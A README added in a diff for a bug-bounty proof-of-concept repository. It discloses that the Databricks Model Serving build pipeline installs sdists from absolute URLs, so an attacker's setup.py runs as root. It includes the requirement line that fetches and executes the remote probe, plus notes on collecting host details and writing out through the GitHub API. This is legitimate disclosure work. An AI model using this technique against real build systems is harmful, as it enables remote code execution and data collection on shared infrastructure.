@@ -1,1 +1,128 @@
-# build probe
+# dbx-build-probe
+
+Verification material for **HackerOne report #4076059** — *Model Serving build pipeline installs
+attacker-supplied sdists from absolute URLs: root code execution on Databricks' build infrastructure.*
+
+Everything in this repository was produced on researcher-owned assets: a Databricks Free Edition
+workspace, a GitHub account and repository owned by the researcher, and a probe package that is
+deliberately benign and read-only. No third-party system, tenant, or credential was touched.
+
+---
+
+## The finding in one line
+
+Databricks Model Serving builds each served model's environment on Databricks build infrastructure.
+A pre-build sanitizer constrains the model's `conda.yaml` — package names resolve from the internal
+mirror only, local-file requirement lines (`./x.tar.gz`) are stripped, off-mirror version pins are
+stripped, and the `channels:` list is regenerated wholesale. **One requirement form passes through
+unsanitized: an absolute `https://` URL.**
+
+```yaml
+pip:
+  - https://github.com/bootmoha639-beep/dbx-build-probe/releases/download/v3/zzbuildprobe-1.2.0.tar.gz
+  - mlflow==3.16.1          # normal pins, unchanged
+  - numpy==2.5.3
+  - pandas==3.0.6
+  - scipy==1.18.1
+  - statsmodels==0.15.0
+```
+
+The build host fetches that tarball, and `setuptools` executes its `setup.py` **as root** inside the
+BuildKit sandbox where serving images are built.
+
+## The probe
+
+[`poc/setup.py`](poc/setup.py) is the entire payload — about twenty lines. Before calling `setup()`
+it collects, and writes into the package's own `build_evidence.py`:
+
+| collected | source |
+|---|---|
+| hostname | `socket.gethostname()` |
+| kernel | `uname -a` |
+| uid / gid | `id` |
+| working directory | `os.getcwd()` |
+| `~/.cache/pip` and `/tmp` listings | `os.listdir` |
+| environment variable **names** | `os.environ.keys()` |
+
+Read-only. No network calls. No environment variable *values*. No writes outside the wheel. The
+`build_evidence.py` written at build time ships inside the built wheel, the wheel is installed into
+the serving image, and a benign `predict` payload reads it back through the HTTP 200 inference
+response.
+
+To build the artifact yourself:
+
+```bash
+cd poc && ./build.sh          # -> dist/zzbuildprobe-<version>.tar.gz
+```
+
+---
+
+## Files
+
+| File | Produced by | What it shows |
+|---|---|---|
+| `poc/` | researcher | The complete source of the sdist distributed in each release — this is the code that executes at build time. |
+| `BUILD_HOST_PROOF_1790859700.txt` | **the build host**, via a GitHub API `PUT` during the build (commit `3d388bb427a0`) | Attacker-controlled code running on Databricks' build host reached the public internet and wrote to an externally controlled service. |
+| `BUILD_HOST_PROOF_1790859691.txt` | **the build host**, via the GitHub API | Earlier capture of the same channel. |
+| `DEEPDIVE_SUMMARY_1790860941.json` | **the build host**, via the GitHub API | Deeper probe: `/run/secrets/pip-docker-build-conf` is present in the sandbox (existence only — contents deliberately not read), plus build-tooling layout. |
+| `DEEPDIVE_SUMMARY_1790860950.json` | **the build host**, via the GitHub API | Same probe, later run: 92 concurrent `pip-metadata-*` directories in `/tmp`. |
+| `BUILD_HOST_ID_OUTPUT.txt` | **the researcher's own workstation** — a local dry run of the probe script, *before* the build | Proof the script works as written. **This is not build-host evidence** (`DESKTOP-RHD2N74`, `uid=197608(PC)`). Included for completeness. |
+| `app.py`, `app.yml`, `requirements.txt` | researcher | A separate probe against Databricks **Apps**, from a different report. Unrelated to the Model Serving chain above. |
+| `poc/build.sh` | researcher | Reproduces the published sdist. |
+
+The release assets (`v1` … `v12`) are the sdist at each stage of the investigation. Each one carries
+a placeholder `zzbuildprobe/build_evidence.py` containing the output of a **local dry run** on the
+researcher's workstation; that file is unconditionally overwritten by `setup.py` at build time and
+has no bearing on the chain.
+
+---
+
+## What to look for in the build log
+
+After registering the model and deploying it to a serving endpoint, the build log contains — in order:
+
+```
+#14 0.039   - https://github.com/bootmoha639-beep/dbx-build-probe/releases/download/v1/zzbuildprobe-1.0.0.tar.gz
+#14 0.049 Configuring system-wide conda to use local channel only
+#14 0.533 Using local channel file:///package-repo/conda-channel instead of conda-forge
+```
+The sanitizer is visible working — channels are regenerated to the internal mirror — while the
+absolute-URL requirement line passes through echoed verbatim.
+
+```
+#14 45.36 Collecting https://github.com/.../zzbuildprobe-1.0.0.tar.gz (from -r /model/condaenv.h5ybkhja.requirements.txt (line 1))
+#14 45.36   Preparing metadata (setup.py): started
+#14 45.36   Preparing metadata (setup.py): finished with status 'done'
+#14 45.36 Building wheel for zzbuildprobe (setup.py): started
+#14 45.36 Building wheel for zzbuildprobe (setup.py): finished with status 'done'
+#14 45.36 Successfully installed ... zipp-4.1.0 zzbuildprobe-1.0.0
+```
+
+`Preparing metadata (setup.py): started` is the moment the attacker-supplied `setup.py` executes.
+`Successfully installed ... zzbuildprobe-1.0.0` is the tarball landing inside the serving image.
+
+## What to look for in the inference response
+
+```json
+{"predictions": "{\"serving_host\": \"mlflow-server.host.local\", \"BUILD_EVIDENCE\": {
+  \"host\": \"buildkitsandbox\",
+  \"uname\": \"Linux buildkitsandbox 6.1.177-224.371.amzn2023.x86_64 ...\",
+  \"id\": \"uid=0(root) gid=0(root) groups=0(root)\",
+  \"cwd\": \"/tmp/pip-req-build-i4mpvtjt\",
+  \"envkeys\": [ \"BUILD_LOG_*_DELIMITER\", \"IS_FEATURE_SERVING_CONTAINER\",
+                \"MLFLOW_SERVING_WHEEL\", \"PIP_CONFIG_FILE\", \"USE_PRIVATE_PYTHON_REPO\", ... ]}}"}
+```
+
+This data was collected by attacker code executing as root on Databricks' build host during the
+image build. It cannot exist otherwise. `USE_PRIVATE_PYTHON_REPO` and `PIP_CONFIG_FILE` are the
+platform's own configuration mandating internal-mirror-only — which is why this is a gap in a
+control that demonstrably exists, not an intended feature.
+
+---
+
+## Suggested remediation
+
+Strip or reject absolute-URL requirement lines (any pip-section entry beginning with `http://` or
+`https://`) the same way `./local` lines and off-mirror pins are stripped. Alternatively, resolve
+all requirements through the internal mirror only, and run pip build steps in a non-root,
+network-restricted, per-build sandbox with no shared `/tmp`.
